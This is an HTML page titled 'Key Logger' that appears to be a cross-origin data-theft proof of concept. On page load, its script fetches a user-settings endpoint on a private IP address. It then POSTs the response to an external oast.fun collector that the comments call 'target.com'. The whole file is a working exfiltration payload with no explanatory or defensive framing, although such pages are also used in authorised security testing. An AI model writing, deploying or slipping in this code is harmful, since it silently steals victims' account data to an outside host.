<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger</title>
    <script>
        // Function to fetch data from victim.com/user and forward it to target.com
        function fetchAndForward() {
            var victimUrl = 'https://172.16.100.122/UserSetting'; // URL of victim.com/user
            var targetUrl = 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/receive'; // URL of target.com's endpoint

            fetch(victimUrl)
                .then(response => response.text()) // Get response text
                .then(data => {
                    // Send the data to target.com
                    fetch(targetUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ data: data })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Failed to send data to target.com');
                        }
                        console.log('Data sent successfully to target.com');
                    })
                    .catch(error => {
                        console.error(error);
                    });
                })
                .catch(error => {
                    console.error('Failed to fetch data from victim.com/user:', error);
                });
        }

        // Call the function when the page loads
        window.onload = function() {
            fetchAndForward();
        };
    </script>
</head>
<body>
    <!-- Your HTML content here -->
</body>
</html>
